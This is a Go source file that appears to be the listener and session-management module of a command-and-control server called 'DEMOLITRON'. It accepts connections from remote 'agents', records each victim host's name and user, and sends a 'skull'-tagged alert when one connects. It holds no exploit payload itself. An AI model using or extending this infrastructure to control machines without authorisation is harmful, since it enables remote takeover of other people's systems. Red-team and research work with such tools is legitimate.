package cmd

import (
	//"crypto/sha256"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	//"hash/sha256"

	"net"
)

func notifAgentConnected(hostname string, sessionID int, notifURL string) {
	req, _ := http.NewRequest("POST", notifURL, strings.NewReader("Host: "+hostname+"\nID: "+strconv.Itoa(sessionID)))
	req.Header.Set("Title", "DEMOLITRON")
	req.Header.Set("Tags", "skull")
	http.DefaultClient.Do(req)
}

func NewListenerList() *ListenerList {
	return &ListenerList{
		Stop: make(chan struct{}),
	}
}

// handleClient handles the client connection
// func handleClient(ll *ListenerList, conn *net.Conn, port string, sl *SessionList, notifURL string) {
// 	if !authSession(conn) {
// 		return
// 	}
// 	fmt.Println("\n\n[+]Agent authenticated successfully !") //\n\n added at first for clarity
// 	fmt.Print("[+]Session Created")                          //2 New lines exist after this fuck me
// 	hostname, user := hostinfo(conn)                         //Get some hostinfo instantly without much headache
// 	currentSessionID := sl.registerSession(port, hostname, user, *conn)
// 	fmt.Println("[!]Sesssion ID: " + strconv.Itoa(currentSessionID))
// 	if notifURL != "" {
// 		notifAgentConnected(hostname, currentSessionID, notifURL)
// 	}
// 	//ll.updateListenerStatus(port, "SESSION") //Not necessary left here for debug purposes
// 	//Checks if the session is still alive. Rewrite this in the sessions and not in the listeners section
// 	for {
// 		//alive := sha256.Sum256([]byte("Areyoualive?!"))
// 		if !authSession(conn) {
// 			fmt.Println("[!]Cleaning Up")     //Need a way of exiting the go routine. Will impliment something cooler later.
// 			sl.closeSession(currentSessionID) //We can use the updateSession functions instead if we want to keep a record of the dead sessions. There is a status field in the session struct after all
// 			return
// 		}
// 		time.Sleep(10 * time.Second)
// 	}
// }

func handleClient(ll *ListenerList, conn *net.Conn, port string, sl *SessionList, notifURL string) {
	if !authSession(conn) {
		return
	}

	fmt.Println("\n\n[+]Agent authenticated successfully !")
	fmt.Print("[+]Session Created")

	hostname, user := hostinfo(conn)
	currentSessionID := sl.registerSession(port, hostname, user, *conn)
	fmt.Println("[!]Session ID: " + strconv.Itoa(currentSessionID))

	if notifURL != "" {
		notifAgentConnected(hostname, currentSessionID, notifURL)
	}

	session := sl.getSessionByID(currentSessionID)
	if session == nil {
		fmt.Println("[-]Unable to retrieve session")
		return
	}

	for {
		select {
		case <-session.StopChan:
			//fmt.Println("[!]Received signal to stop session")
			return
		default:
			if !authSession(conn) {
				//fmt.Println("[!]Client dropped - Cleaning Up")
				sl.closeSession(currentSessionID)
				return
			}
			time.Sleep(10 * time.Second)
		}
	}
}

func (ll *ListenerList) registerListener(port string, sl *SessionList, notifURL string) {
	addr := ":" + port

	// Resolve TCP address
	tcpAddr, err := net.ResolveTCPAddr("tcp", addr)
	if err != nil {
		fmt.Println("[-] Could not resolve TCP address:", err)
		return
	}

	// Listen on the specified port
	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		fmt.Println("[-] Could not listen on port:", err)
		return
	}

	// Create a new Listener struct
	newListener := &Listener{
		Port:     port,
		Status:   "Listening",
		Listener: listener,
	}

	// Add to the head of the listener list
	newListener.Next = ll.Head
	ll.Head = newListener

	fmt.Println()
	fmt.Println("[+] Listening on port:", addr)
	fmt.Println()

	// Listener goroutine
	go func() {
		// Use a select to monitor listener closure
		for {
			conn, err := listener.Accept()
			if err != nil {
				// Check if the error is due to listener being closed
				if strings.Contains(err.Error(), "use of closed network connection") {
					//fmt.Println("[!] Listener on port", port, "closed.")
					return // Exit the goroutine if the listener is closed
				}
				// Handle other errors
				fmt.Println("[-] Error accepting connection:", err)
				continue
			}

			// Handle the connection in a new goroutine
			go handleClient(ll, &conn, port, sl, notifURL)
		}
	}()
}

// closeListeners closes all active listeners without affecting sessions
func (ll *ListenerList) closeListeners() {
	fmt.Println()
	current := ll.Head
	for current != nil {
		// Close the listener (not affecting sessions)
		fmt.Println("[!] Closing listener on port:", current.Port)
		current.Listener.Close()

		// Move to the next listener in the list
		current = current.Next
	}
	ll.Head = nil // Reset the listener list (but leave sessions intact)
	fmt.Println("[+] All listeners closed.")
	fmt.Println()
}

// Displays the active listeners
func (ll *ListenerList) displayListeners() {
	fmt.Println("\n[!]Active Listeners:")
	current := ll.Head
	for current != nil {
		fmt.Println("[+]Port:", current.Port, "- Status:", current.Status)
		current = current.Next
	}
	fmt.Println()
}

// Updates the status of the listener. Dont need it but I ll keep it
func (ll *ListenerList) updateListenerStatus(targetPort string, status string /*, conn net.Conn*/) { //This is useless only 1 place uses it
	current := ll.Head
	for current.Port != targetPort {
		current = current.Next
	}
	current.Status = status
}

// closeListeners closes all active listeners
// func (ll *ListenerList) closeListeners() {
// 	fmt.Println()
// 	current := ll.Head
// 	for current != nil {
// 		fmt.Println("[!]Closing listener on port:", current.Port)
// 		current.Listener.Close()
// 		current = current.Next
// 	}
// 	ll.Head = nil // Reset the listener list
// 	fmt.Println("[+]All listeners closed")
// 	fmt.Println()
// }
